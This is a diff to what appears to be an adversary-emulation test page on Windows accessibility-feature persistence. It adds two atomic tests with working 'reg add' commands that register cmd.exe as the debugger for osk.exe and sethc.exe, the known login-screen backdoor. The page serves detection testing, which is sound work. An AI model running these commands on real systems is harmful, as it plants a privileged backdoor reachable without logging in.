@@ -36,3 +36,37 @@ Other accessibility features exist that may also be leveraged in a similar fashi
 - Atomic Test #6 - Attaches Command Prompt As Debugger To Process - DisplaySwitch
 
 - Atomic Test #7 - Attaches Command Prompt As Debugger To Process - AtBroker
+
+## Atomic Test #1 - Attaches Command Prompt As Debugger To Process - osk
+This allows adversaries to execute the attached process
+
+**Supported Platforms:** Windows
+
+#### Inputs
+
+| Name | Description | Type | Default Value | 
+|:------:|:-------------:|:------:|:---------------:|
+| target_executable | File You Want To Attach cmd To | String | osk.exe|
+
+#### Run it with `command_prompt`!
+
+```
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+```
+
+## Atomic Test #2 - Attaches Command Prompt As Debugger To Process - sethc
+This allows adversaries to execute the attached process
+
+**Supported Platforms:** Windows
+
+#### Inputs
+
+| Name | Description | Type | Default Value | 
+|:------:|:-------------:|:------:|:---------------:|
+| target_executable | File You Want To Attach cmd To | String | sethc.exe|
+
+#### Run it with `command_prompt`!
+
+```
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+```
